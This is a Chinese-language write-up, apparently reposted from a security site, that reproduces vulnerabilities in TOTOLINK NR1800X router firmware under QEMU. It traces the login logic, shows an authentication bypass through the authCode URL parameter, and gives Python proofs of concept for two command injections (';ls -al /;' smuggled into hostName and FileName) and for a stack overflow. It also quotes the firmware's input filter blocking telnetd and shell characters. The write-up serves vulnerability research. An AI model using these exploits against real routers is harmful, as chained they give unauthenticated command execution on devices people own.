# TOTOLINK_NR1800X漏洞复现
> Cyberangel
> 来源：https://www.iotsec-zone.com/article/317

# 0、http服务模拟
该型号路由器的http服务模拟很简单，这里就简单的粘贴几行命令吧（如果你对具体的模拟步骤感兴趣，请参考之前的文章）：
```bash
# 0、经过收集信息后可知，该固件的架构为mipsel
# 1、配置ubuntu网卡：
$ sudo tunctl -t tap0
$ sudo ifconfig tap0 [ip]
# 2、启动qemu-system：
$ sudo qemu-system-mipsel -M malta \ 
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_squeeze_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" -nographic \
    -net nic -net tap,ifname=tap0,script=no,downscript=no
# 3、binwalk -Me解压固件
# 4、压缩squashfs-root到squashfs-root.tar.gz，使用ssh将该压缩包传入qemu
# 5、qemu解压缩该压缩包，配置网络：
$ ifconfig eth0 [ip]
# 6、挂载：
$ mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# 7、进入shell：
$ chroot ./squashfs-root sh
```
该路由器的web服务由/usr/sbin/lighttpd管理，“尝试”直接在根目录启动（“尝试”二字的深意：别忘了之前在模拟ASUS路由器时踩的坑！）：
![0.png](https://www.iotsec-zone.com/images/MdImg/e153ba3f1392a5c76b940233fd601666.png)
提示需要config，搜索后发现在固件包中有现成的/lighttp/lighttpd.conf配置文件，直接加载就行lighttpd -f /lighttp/lighttpd.conf：
![1.png](https://www.iotsec-zone.com/images/MdImg/45982fc90169cbcea3aaf62f0339532a.png)
在浏览器中访问（qemu IP：192.168.5.1）：
![2.png](https://www.iotsec-zone.com/images/MdImg/e811ea801718ccb0e5a798db4cddc955.png)
模拟成功。
# 1、TOTOLINK登录流程探寻
## ①、请求cstecgi.cgi
- 因为我的Ubuntu虚拟机中没有Burpsuite，为了抓包方便，所以我使用rinetd将qemu的80端口映射到虚拟机的8080。
- 此时虚拟机的ip为：192.168.2.168（在后续文章篇幅中因为网络环境的变化可能导致IP变化，注意一下就行）。
访问Web页面，输入密码cyberangel并抓取登录包：
![3.png](https://www.iotsec-zone.com/images/MdImg/243a86ea5c5e57e99c5a5149d3af6395.png)
一个包一个包来看吧，首先是/cgi-bin/cstecgi.cgi?action=login：

```bash
# 请求包----------------------------------------------------------------------------------------------------------------------------------------------------
POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1
Host: 192.168.2.168:8080
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.2.168:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.2.168:8080/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=cyberangel
# 响应包----------------------------------------------------------------------------------------------------------------------------------------------------
HTTP/1.1 302 Found
Connection: close
Content-type: text/plain
Connection: Keep-Alive
Pragma: no-cache
Cache-Control: no-cache
Location: http://192.168.2.168:8080/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login
Date: Wed, 09 Nov 2022 15:42:42 GMT
Server: lighttpd/1.4.20
Content-Length: 11

protal page
```
IDA打开cstecgi.cgi，搜索formLoginAuth.htm字符串，根据响应包的Location可以确定是使用了第三个：
![4.png](https://www.iotsec-zone.com/images/MdImg/e8a061f0f69ee18570650baeeadca0a5.png)
交叉引用过去，定位到sub_42AEEC，我们将这个函数重命名为check；对此函数的一些变量重命名整理后，得到：

```bash
int __fastcall check(int jsonData)
{
  char *loginAuthUrl; // $s5
  int v3; // $a0
  int v4; // $v0
  int v5; // $s2
  char *input_username; // $s2
  char *input_password; // $s5
  char *http_host; // $s3
  char *flag; // $s0
  char *verify; // $v0
  int verifyValue; // $s4
  int wizard_flag; // $s1
  int v13; // $s6
  char *http_username; // $v0
  char *http_passwd; // $v0
  int v16; // $s3
  int v17; // $s3
  BOOL authCode; // $s3
  int v19; // $s1
  int v20; // $v0
  char *v21; // $s0
  char goURL[128]; // [sp+28h] [-1830h] BYREF
  char v24[4096]; // [sp+A8h] [-17B0h] BYREF
  char v25[64]; // [sp+10A8h] [-7B0h] BYREF
  char v26[1024]; // [sp+10E8h] [-770h] BYREF
  char v27[128]; // [sp+14E8h] [-370h] BYREF
  char v28[256]; // [sp+1568h] [-2F0h] BYREF
  char host[256]; // [sp+1668h] [-1F0h] BYREF
  int http_username_cp[8]; // [sp+1768h] [-F0h] BYREF
  char v31; // [sp+1788h] [-D0h]
  int http_passwd_cp[8]; // [sp+178Ch] [-CCh] BYREF
  char v33; // [sp+17ACh] [-ACh]
  int v34[8]; // [sp+17B0h] [-A8h] BYREF
  char urlDecode_password[64]; // [sp+17D0h] [-88h] BYREF
  int v36[16]; // [sp+1810h] [-48h] BYREF
  char *v37; // [sp+1850h] [-8h]
  int tmpCJson; // [sp+1854h] [-4h]

  memset(goURL, 0, sizeof(goURL));
  memset(v24, 0, sizeof(v24));
  memset(v25, 0, sizeof(v25));
  memset(v26, 0, sizeof(v26));
  memset(v27, 0, sizeof(v27));
  memset(v28, 0, sizeof(v28));
  memset(host, 0, sizeof(host));
  http_username_cp[0] = 0;
  http_username_cp[1] = 0;
  http_username_cp[2] = 0;
  http_username_cp[3] = 0;
  http_username_cp[4] = 0;
  http_username_cp[5] = 0;
  http_username_cp[6] = 0;
  http_username_cp[7] = 0;
  v31 = 0;
  http_passwd_cp[0] = 0;
  http_passwd_cp[1] = 0;
  http_passwd_cp[2] = 0;
  http_passwd_cp[3] = 0;
  http_passwd_cp[4] = 0;
  http_passwd_cp[5] = 0;
  http_passwd_cp[6] = 0;
  http_passwd_cp[7] = 0;
  v33 = 0;
  v34[0] = 0;
  v34[1] = 0;
  v34[2] = 0;
  v34[3] = 0;
  v34[4] = 0;
  v34[5] = 0;
  v34[6] = 0;
  v34[7] = 0;
  memset(urlDecode_password, 0, sizeof(urlDecode_password));
  loginAuthUrl = websGetVar(jsonData, "loginAuthUrl", (char *)"");
  tmpCJson = cJSON_CreateObject();
  v3 = 0;
  v37 = v28;
  while ( 1 )
  {
    v5 = v3 + 1;
    if ( getNthValueSafe(v3, loginAuthUrl, "&", v26, 1024) == -1 )
      break;
    if ( getNthValueSafe(0, v26, "=", v27, 128) != -1 && getNthValueSafe(1, v26, "=", v37, 256) != -1 )
    {
      v4 = cJSON_CreateString(v37);
      cJSON_AddItemToObject(tmpCJson, v27, v4);
    }
    v3 = v5;
  }
  input_username = websGetVar(tmpCJson, "username", (char *)"");	// 获取用户输入的账号（该型号的路由器默传入的账号为admin）
  input_password = websGetVar(tmpCJson, "password", (char *)"");	// 获取用户输入的密码
  http_host = websGetVar(tmpCJson, "http_host", (char *)"");
  flag = websGetVar(tmpCJson, "flag", (char *)&word_4370EC);
  verify = websGetVar(tmpCJson, "verify", (char *)&word_4370EC);
  verifyValue = atoi(verify);
  wizard_flag = nvram_get_int("wizard_flag");
  if ( wizard_flag )
  {
    v13 = nvram_safe_get("opmode_custom");
    if ( nvram_get_int("ren_qing_style") == 1 )
    {
      wizard_flag = 1;
    }
    else if ( (!strcmp(v13, "gw") || !strcmp(v13, "wisp")) && isWanConnected()
           || !strcmp(v13, "rpt") && get_apcli_connected() == 1
           || !strcmp(v13, "br") && nvram_get_int("dl_status_lan") == 1 )
    {
      wizard_flag = 0;
    }
  }
  urldecode((int)input_password, urlDecode_password);
  http_username = (char *)nvram_safe_get("http_username");			// 获取路由器后台的账号
  strcpy((char *)http_username_cp, http_username);
  http_passwd = (char *)nvram_safe_get("http_passwd");				// 获取路由器后台的密码
  strcpy((char *)http_passwd_cp, http_passwd);
  if ( *http_host )
    strcpy(host, http_host);
  else
    strcpy(host, (char *)v34);
  if ( verifyValue == 1 )
  {
    v16 = nvram_get_int("verify_code_flag") + 1;
    nvram_set_int_temp("verify_code_flag", v16);
    if ( v16 >= 3 )
    {
      sysinfo(v36);
      sprintf(v25, "%ld", v36[0]);
      nvram_set_temp("tmp_sys_uptime", v25);
    }
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "login_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      strcpy(goURL, "phone/login.html");
    }
    else
    {
      strcpy(goURL, "login.html");
    }
    goto LABEL_54;
  }
  nvram_set_int_temp("verify_code_flag", 0);
  nvram_set_int_temp("tmp_sys_uptime", 0);
  v17 = strcmp(input_username, http_username_cp);					// 检查输入的username是否正确
  if ( !strcmp(urlDecode_password, http_passwd_cp) )				// 检查输入的password是否正确
                                                                    // 根据检查确定authCode的值
    	/*
        注意：
			这里变量"authCode"的命名可不是乱来的，是我根据下面的
        	",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login\"}"
        	得来的
		*/ 
    authCode = v17 != 0;
  else
    authCode = 1;
  if ( flag )
    strcpy(input_username, (char *)http_username_cp);	// 若flag未设置，则input_username默认为admin（strcpy）
  if ( !strcmp(input_username, http_username_cp) && !strcmp(urlDecode_password, http_passwd_cp)
    || nvram_get_int("ren_qing_style") == 1 && !*(_BYTE *)nvram_safe_get("http_passwd") )
  {
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "wan_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      if ( wizard_flag )
        strcpy(goURL, "phone/wizard.html");
      else
        strcpy(goURL, "phone/home.html");
    }
    else if ( wizard_flag )
    {
      strcpy(goURL, "wizard.html");
    }
    else
    {
      strcpy(goURL, "home.html");
    }
    nvram_set_int_temp("cloudupg_checktype", 1);
    doSystem("lktos_reload %s", "cloudupdate_check 2>/dev/null");
    authCode = 1;
  }
  else
  {
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "login_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      strcpy(goURL, "phone/login.html");
    }
    else
    {
      strcpy(goURL, "login.html");
    }
    if ( authCode )
    {
LABEL_54:
      system("echo ''> /tmp/login_flag");
      authCode = 0;
      goto LABEL_55;
    }
  }
LABEL_55:
  snprintf(v24, 4096, "{\"httpStatus\":\"%s\",\"host\":\"%s\"", "302", host);
  v19 = strlen(v24);
  if ( atoi(flag) == 1 )
  {
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login&flag=1\"}",
      host,
      authCode,
      input_username,
      goURL);
  }
  else if ( !strcmp(flag, "ie8") )
  {
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login&flag=ie8\"}",
      host,
      authCode,
      input_username,
      goURL);
  }
  else
  {                           // 根据前面的抓包可知，程序流程走的是该else分支
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login\"}",// 响应包
      host,
      authCode,
      input_username,
      goURL);
  }
  v20 = cJSON_Parse(v24);
  v21 = websGetVar(v20, "redirectURL", (char *)"");
  puts("HTTP/1.1 302 Redirect to page");
  puts("Content-type: text/plain");
  puts("Connection: Keep-Alive\nPragma: no-cache\nCache-Control: no-cache");
  printf("Location: %s\n\n", v21);
  printf("protal page");		// protal page
  return 0;
}
```
如上面代码框中第250行所示，响应包的protal page（门户页面）正是来自这里，如下图所示：
![5.png](https://www.iotsec-zone.com/images/MdImg/47ae369299f84d532b882ded789dacc5.png)
继续对check函数交叉引用，有：
![6.png](https://www.iotsec-zone.com/images/MdImg/5f50f74745ea766fa2f6cbe732211484.png)
大致翻看了一下周边的数据，发现它们都存放在某个“字典”中；例如，我们可以使用某个键（key）来调用check函数【值(value）】。对check_function交叉引用后可来到main函数，大致逆向后，有如下伪代码：
- 注：这里“字典”、“键（key）”、“值（value）”这三个概念均引用自Python的dict数据类型
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int userQueryURL; // $s0
  int v4; // $v0
  int v5; // $s1
  int v6; // $s2
  int v7; // $s1
  char *loginAuthUrl; // $s5
  int flag_TruE; // $s1
  BOOL verify_error; // $s0
  const char *http_host; // $a3
  char *loginJsonData_cp; // $a0
  int v13; // $s1
  int v14; // $s3
  int v15; // $s3
  int v16; // $v0
  int jsonData; // $s6
  int userTopicurl; // $s3
  int v19; // $v0
  int NEED_AUTH; // $v0
  int v22; // $v0
  int (*v23)(); // $s2
  int (**v24)(); // $s1
  int v25; // $s0
  bool v26; // dc
  int (**v27)(); // $s1
  int v28; // $s0
  int (**v29)(); // $s1
  int v30; // $s0
  int (**v31)(); // $s1
  int v32; // $s0
  int v33; // $s0
  const char *v34; // $v0
  char v35[256]; // [sp+28h] [-1244h] BYREF
  char loginJsonData[4096]; // [sp+128h] [-1144h] BYREF
  char v37[256]; // [sp+1128h] [-144h] BYREF
  int v38[8]; // [sp+1228h] [-44h] BYREF
  int v39[9]; // [sp+1248h] [-24h] BYREF

  memset(v35, 0, sizeof(v35));
  memset(v37, 0, sizeof(v37));
  memset(loginJsonData, 0, sizeof(loginJsonData));
  userQueryURL = getenv("QUERY_STRING");
  v4 = getenv("CONTENT_LENGTH");
  v5 = strtol(v4, 0, 10);
  v6 = getenv("stationIp");
  if ( !v6 )
    v6 = getenv("REMOTE_ADDR");
  v7 = v5 + 1;
  loginAuthUrl = (char *)malloc(v7);
  memset(loginAuthUrl, 0, v7);
  fread(loginAuthUrl, 1, v7, stdin);
  if ( !userQueryURL )
    goto LABEL_15;
  if ( strstr(userQueryURL, "action=login") )	// 传入的url有“action=login”字样
  {
    if ( strstr(userQueryURL, "flag=ie8") )
    {                                           // ie8浏览器
      v33 = strstr(userQueryURL, "verify=error");
      v34 = (const char *)getenv("http_host");
      sprintf(
        loginJsonData,
        "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&flag=ie8&verify=%d\"}",
        loginAuthUrl,
        v34,
        v33 != 0);
      loginJsonData_cp = loginJsonData;
    }
    else
    {                                           // 非ie8浏览器
      flag_TruE = strstr(userQueryURL, "flag=1");
      verify_error = strstr(userQueryURL, "verify=error") != 0;
      http_host = (const char *)getenv("http_host");
      if ( flag_TruE )
        sprintf(
          loginJsonData,
          "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&flag=1&verify=%d\"}",
          loginAuthUrl,
          http_host,
          verify_error);
      else
        sprintf(
          loginJsonData,
          "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&verify=%d\"}",
          loginAuthUrl,
          http_host,
          verify_error);
      loginJsonData_cp = loginJsonData;
    }
    goto LABEL_16;                              // 无论是什么浏览器，最终都得goto到LABEL_16
  }
  if ( !strstr(userQueryURL, "action=upload") )
  {
LABEL_15:
    loginJsonData_cp = loginAuthUrl;
    goto LABEL_16;
  }
  v38[0] = 0;
  v38[1] = 0;
  v38[2] = 0;
  v38[3] = 0;
  v38[4] = 0;
  v38[5] = 0;
  v38[6] = 0;
  v38[7] = 0;
  v39[0] = 0;
  v39[1] = 0;
  v39[2] = 0;
  v39[3] = 0;
  v39[4] = 0;
  v39[5] = 0;
  v39[6] = 0;
  v39[7] = 0;
  v13 = getenv("UPLOAD_FILENAME");
  v14 = getenv("CONTENT_LENGTH");
  getNthValueSafe(1, (void *)userQueryURL, "&", v35, 256);
  v15 = cutUploadFile(v37, v13, v14);
  if ( !strcmp(v35, "UploadOpenVpnCert") )
  {
    getNthValueSafe(2, (void *)userQueryURL, "&", v38, 32);
    getNthValueSafe(3, (void *)userQueryURL, "&", v39, 32);
    sprintf(
      loginJsonData,
      "{\"topicurl\":\"%s\",\"FileName\":\"%s\",\"ContentLength\":\"%d\",\"cert_type\":\"%s\",\"cert_name\":\"%s\",\"Full"
      "Name\": \"%s\" }",
      v35,
      "/tmp/linux.trx",
      v15,
      (const char *)v38,
      (const char *)v39,
      v37);
  }
  else
  {
    v16 = strstr(userQueryURL, "flag=1");
    sprintf(
      loginJsonData,
      "{\"topicurl\":\"%s\",\"FileName\":\"%s\",\"ContentLength\":\"%d\",\"flags\":\"%d\",\"FullName\": \"%s\" }",
      v35,
      "/tmp/linux.trx",
      v15,
      v16 != 0,
      v37);
  }
  loginJsonData_cp = loginJsonData;
LABEL_16:										// LABEL_16
  jsonData = cJSON_Parse(loginJsonData_cp);     // cJSON_Parse：string -> json
  userTopicurl = (int)websGetVar(jsonData, "topicurl", (char *)"");// 获取topicurl【topic-url，该变量很重要】
  v19 = strchr(userTopicurl, '/');
  if ( v19 )
    userTopicurl = v19 + 1;
  NEED_AUTH = getenv("NEED_AUTH");
  if ( NEED_AUTH
    && !strcmp(NEED_AUTH, "1")
    && strcmp(userTopicurl, "getInitCfg")
    && strcmp(userTopicurl, "getLoginCfg")
    && strcmp(userTopicurl, "loginAuth")        // 登录
    && strcmp(userTopicurl, "UploadCustomModule")
    && strcmp(userTopicurl, "getSysStatusCfg")
    && strcmp(userTopicurl, "getCrpcCfg") )
  {
    sub_42EFC0(501);                            // HTTP/1.1 501 OK
    return 0;
  }
  if ( strstr(userTopicurl, "getDmzCfg") )
  {
    v22 = cJSON_CreateString(v6);
    cJSON_AddItemToObject(jsonData, "stationIp", v22);
  }
  if ( strstr(userTopicurl, "get") )            // get
  {
    v23 = off_44A090;
    v24 = &off_44A0D4;
    if ( off_44A090 )
    {
      v25 = 0;
      while ( strncmp(userTopicurl, &get_handle_t[68 * v25], 64) )
      {
        ++v25;
        v23 = *v24;
        v26 = *v24 != 0;
        v24 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
LABEL_52:
      ((void (__fastcall *)(int))v23)(jsonData);// 调用函数
      goto LABEL_54;                            // LABEL_54:
                                                //   cJSON_Delete(jsonData);
                                                //   free(loginAuthUrl);
                                                //   return 0;
    }
  }
  else if ( strstr(userTopicurl, "set") )       // set
  {
    v23 = off_44B040;
    v27 = &off_44B084;
    if ( off_44B040 )
    {
      v28 = 0;
      while ( strncmp(userTopicurl, &set_handle_t[68 * v28], 64) )
      {
        ++v28;
        v23 = *v27;
        v26 = *v27 != 0;
        v27 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;
    }
  }
  else
  {
    if ( !strstr(userTopicurl, "del") )
    {                                           // 若找不到del
      v23 = check_function;
      if ( !check_function )
        goto LABEL_54;
      v31 = &off_44C0B8;
      v32 = 0;
      while ( strncmp(userTopicurl, &other_handle_t[68 * v32], 0x40) )
      {
        ++v32;
        v23 = *v31;
        v26 = *v31 != 0;
        v31 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;                            // 调用相应的函数
    }
    v23 = off_44BD00;                           // del
    v29 = &off_44BD44;
    if ( off_44BD00 )
    {
      v30 = 0;
      while ( strncmp(userTopicurl, &del_handle_t[68 * v30], 0x40) )
      {
        ++v30;
        v23 = *v29;
        v26 = *v29 != 0;                        // failure
        v29 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;                            // 调用相应的函数
    }
  }
LABEL_54:
  cJSON_Delete(jsonData);
  free(loginAuthUrl);
  return 0;
}
```
这个函数也很简单，说白了就是根据用户请求的参数去调用了相应的函数，更详细的说明我们留到“漏洞复现”再说。
## ②、请求lighttpd
![7.png](https://www.iotsec-zone.com/images/MdImg/1ef136da0fd8dd1baa8939c9222d5ec0.png)
经过cstecgi.cgi会得到[http://192.168.2.168:8080/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login](http://192.168.2.168:8080/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login)
，由于目标文件formLoginAuth.htm为htm文件，所以需要交由lighttpd处理。对lighttpd逆向搜索"formLoginAuth.htm"，来到userloginAuth函数：
```c
BOOL __fastcall userloginAuth(int a1, int a2, _BYTE *a3)	// 1、cstecgi.cgi与lighttpd在编译时都没有去符号
{															// 2、userloginAuth为lighttpd自带符号
  int v4; // $s2

  v4 = **(_DWORD **)(a1 + 320);
  if ( strstr(v4, "formLoginAuth.htm") )
  {
    Form_Login(a1, a2, (int)a3);                // login
    return 1;
  }
  if ( strstr(v4, "formLogout.htm") )
  {
    Form_Logout(a1, a2, a3);
    return 1;
  }
  if ( strstr(v4, "formLogoutAll.htm") )
  {
    Form_LogoutAll(a1, a2);
    return 1;
  }
  a3[3] = 0;
  *a3 = 0;
  a3[1] = 0;
  a3[2] = 0;
  return checkLoginUser(a1, a2) == 1;
}
```
根据函数名称"用户登录验证"就知道来对了位置，Form_Login有如下两块代码：
![8.png](https://www.iotsec-zone.com/images/MdImg/d8031fb82931a4026d8ba5e5499170eb.png)
很清晰的可以看到当authCode == 1时即可让lighttpd生成session。说到这里就要引起我们的注意了，之前的cstecgi.cgi中就有一个authCode的变量，根据这两个二进制文件的关系可知：
1. cstecgi.cgi的authCode为stack上的局部变量，lighttpd的authCode由URL传入。
2.根据本次的网络请求，cstecgi.cgi中生成的authCode值通过URL的方式传入到了lighttpd中。
3.lighttpd根据authCode决定是否生成session。
这就很明显了，虽然当密码错误时cstecgi.cgi生成的authCode我们无法控制，但是两个二进制文件之间的authCode传递可以由我们任意控制，即这里存在未授权登录漏洞：[http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login](http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login)
（此时虚拟机IP为192.168.2.177）。我们可以动态调试看一下：
1. IDA中Form_Login下断点：
![9.png](https://www.iotsec-zone.com/images/MdImg/388a2bc024716927153123456627b056.png)
2.执行lighttpd
3.qemu执行./gdbserver-7.7.1-mipsel-mips32-v1 --attach :1234 [lighttpd_PID]
4. IDA连接gdbserver
5. 访问[http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login](http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login)
得到：
```c
int __fastcall Form_Login(int user_struct, int a2, int a3)	// user_struct是有关“用户传入的参数”的结构体
{
	// ...
  v6 = (char *)inet_ntoa(*(_DWORD *)(user_struct + 128));	// *(user_struct + 128) == "192.168.2.177"

  authCodeValue = 0;
  if ( !buffer_is_empty(*(_DWORD *)(user_struct + 328)) )
  {
    strncpy(v25, **(_DWORD **)(user_struct + 328), 1023);
	// ...
    while ( 1 )
    {
      v26 = (char *)(v10 + 1);
      if ( getNthValueSafe(v10, (int)v27, 38, (int)v24, 512) == -1 )
        break;
      if ( getNthValueSafe(0, (int)v24, 61, (int)v21, 128) != -1 && getNthValueSafe(1, (int)v24, 61, v9, 128) != -1 )
      {	// v24 == "authCode=0"
        if ( strstr(v21, "authCode") )	// *v21 == "authCode"
          authCodeValue = atoi(v9);		// authCodeValue == *v9 == "1"
        if ( strstr(v21, "userName") )
          strcpy(v31, v9);
        if ( strstr(v21, "password") )
          strcpy(v30, v9);
        if ( strstr(v21, "goURL") )
          strcpy(v29, v9);
        if ( strstr(v21, "flag") )
          strcpy(v28, v9);
      }
      v10 = (int)v26;
    }
  }
    // ...
}
```
从上面代码框的结果来看，这里确实可以绕过登录。该过程会发送3个关键的数据包，302重定向时即可获取有效的SESSION_ID：
![10.png](https://www.iotsec-zone.com/images/MdImg/216cfc22f23b2371a5118f84eb90a0d8.png)
# 2、漏洞复现
下面我们会开始复现3个CVE，有关于这些CVE的详细信息均可以在IoTsec-Zone的安全情报中找到：
![11.png](https://www.iotsec-zone.com/images/MdImg/88734a0d6bc2175a93f2085f5c5189a5.png)
## ①、CVE-2022-41525
该漏洞点在cstecgi.cgi的sub_421C98函数中：
![12.png](https://www.iotsec-zone.com/images/MdImg/c366476c1496c1d9bc1876cb88eec5b9.png)
反复交叉引用，调用链如下：sub_422D3C -> sub_421C98：
![13.png](https://www.iotsec-zone.com/images/MdImg/f131226ee538a4188f9bdb0ebf020c57.png)
sub_42B9F8-> sub_422D3C -> sub_421C98：
![14.png](https://www.iotsec-zone.com/images/MdImg/a3948df49465f78c7a00868c8f046c36.png)
继续交叉引用，发现IDA无法继续查找了：
![15.png](https://www.iotsec-zone.com/images/MdImg/18fa938b8955af22f3707423f0678c7d.png)
其实这是IDA的锅，还记得之前的那个check函数吗：
![16.png](https://www.iotsec-zone.com/images/MdImg/75a07551a738e492d7a106223ac8dc81.png)
它的调用流程为：
1. 获取topicurl：
![17.png](https://www.iotsec-zone.com/images/MdImg/e67bbf21cfb20e67f87aa1f2046a0d4e.png)
2. 匹配对应的函数：
![18.png](https://www.iotsec-zone.com/images/MdImg/8f3a50342a48d3b7ecaecf4c491e91fc.png)
3. 调用函数：
![19.png](https://www.iotsec-zone.com/images/MdImg/51e244c187dcca3f23518360e6f0eb96.png)
如下图所示，“键（key）”就是"loginAuth"字符串，“值（value）”就是check函数：
![20.png](https://www.iotsec-zone.com/images/MdImg/595893ef4f44bd832dd70c4cde8fbd10.png)
while循环会以check_function为起始地址根据用户传入的topicurl（key）遍历other_handle_t函数表，直到查找到用户指定功能的函数地址（value）；相应的，现在我们寻找的sub_42B9F8应该也有对应的topicurl，既然该函数中有这么多关于nvram的设置，那我盲猜它属于set_handle_t：
![21.png](https://www.iotsec-zone.com/images/MdImg/b6b8f8040771d9bdfe251c8efc8cceab.png)
![22.png](https://www.iotsec-zone.com/images/MdImg/90ad98d3c3e6d1c8546dbefb85d0eaed.png)
向下滑动查找就能找到：
![23.png](https://www.iotsec-zone.com/images/MdImg/581da4bb186f9cb284ea404f3a0fd258.png)
![24.png](https://www.iotsec-zone.com/images/MdImg/1cf26b3970923043e6d08b3bf6772ed9.png)
所以该函数的名称为setOpModeCfg：
![25.png](https://www.iotsec-zone.com/images/MdImg/fa3c4e8727d3f6d91292020cd3584462.png)
综合上面的信息，可以有以下poc：

```python
import requests

url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"			# 目标可执行文件
cookie = {"Cookie":"SESSION_ID=2:1668131006:2"}			# 有效的cookie，通过前面的验证绕过即可获取
data = {
    "topicurl" : "setOpModeCfg",						# setOpModeCfg
	"proto" : "5",										# 将值设置为5
	"switchOpMode" : "1",
	"hostName" : "';ls -al /;'"							# 命令注入，websGetVar(a1,"hostName","") == ";ls -al /;"(注意这里是两层引号)
                                                        # 因为：echo '%s' > /proc/sys/kernel/hostname
}
response = requests.post(url, json=data, cookies=cookie)	# 授权命令执行
print(response.text)
```
![26.png](https://www.iotsec-zone.com/images/MdImg/b7bdd16e6be5f9c3b66eff96c1629051.png)
## ②、CVE-2022-41518
CVE-2022-41525的成因是cstecgi.cgi的doSystem过滤不严谨，依循着这条链查找：
![27.png](https://www.iotsec-zone.com/images/MdImg/dd7d795ff2a021053e1043ea6092bf09.png)
确实有很多函数调用了doSystem，那就看参数可控不可控了。CVE-2022-41518的漏洞存在于UploadFirmwareFile，同样，需要像之前一样处理下：
![28.png](https://www.iotsec-zone.com/images/MdImg/faae72f8ae335e183b0f69ada1260d0e.png)
交叉引用到sub_42D3B4：
![29.png](https://www.iotsec-zone.com/images/MdImg/315fabda89a5b644f51bd54f476527ce.png)
该CVE也是授权命令执行，但结合之前的漏洞可以成为未授权命令执行，poc如下：
```python
import requests
url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1668133776:2"}
data = {
    'topicurl' : "UploadFirmwareFile",
	"FileName" : ";ls -al /;"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.status_code)
print(response.text)
```
![30.png](https://www.iotsec-zone.com/images/MdImg/2670d0b0bb372e11946a6101dd1f790c.png)
## ③、CVE-2022-41523
漏洞类型为Stack OverFlow，漏洞点仍然在cstecgi.cgi：
![31.png](https://www.iotsec-zone.com/images/MdImg/4b4e4b8d2b7e67d1ab23d222e2d9bfea.png)
![32.png](https://www.iotsec-zone.com/images/MdImg/42cd3cab3a0d8762d4616c1031a0f176.png)
这里没有命令执行漏洞，因为对用户输入的字符进行了过滤（那为啥前面的漏洞不过滤呢？是在想不通...）：
```c
BOOL __fastcall Validity_check(int a1)
{
  BOOL result; // $v0

  if ( strchr(a1, ';')
    || strstr(a1, ".sh")
    || strstr(a1, "iptables")
    || strstr(a1, "telnetd")
    || strchr(a1, '&')
    || strchr(a1, '|')
    || strchr(a1, '`')
    || strchr(a1, '$') )
  {
    result = 1;
  }
  else
  {
    result = strchr(a1, '\n') != 0;
  }
  return result;
}
```
栈溢出的poc如下：
```python
import requests

url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1668135762:2"}
data = {
    'topicurl' : "setTracerouteCfg",
	"command" : "a"*0x1000,
    "num": "1"
 }
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```
![33.png](https://www.iotsec-zone.com/images/MdImg/16e3211d9832224f0cba6d34132d1dbd.png)

`● 上图说明的“cgi崩溃后会自动重启”其实很不准确，往后看你就知道了...
`
# 3、补充
## ①、关于websGetVar函数
哦对了，在这里我们再说一下函数websGetVar吧，伪代码如下：
```c
char *__fastcall websGetVar(int a1, _BYTE *a2, char *a3)
{
  _DWORD *v4; // $v0
  int v6; // $v1

  if ( !a2 || !*a2 )
    _assert("var && *var", "cgi_common.c", 655, "websGetVar");
  v4 = (_DWORD *)cJSON_GetObjectItem();
  if ( v4 )
  {
    if ( v4[4] )
      return (char *)v4[4];
    v6 = v4[3];
    if ( v6 )
    {
      if ( v6 == 1 )
      {
        a3 = "1";
      }
      else if ( v6 == 3 )
      {
        sprintf(byte_44C880, "%d", v4[5]);
        a3 = byte_44C880;
      }
      else
      {
        a3 = (char *)"";
      }
    }
    else
    {
      a3 = (char *)&word_4370EC;
    }
  }
  return a3;
}
```
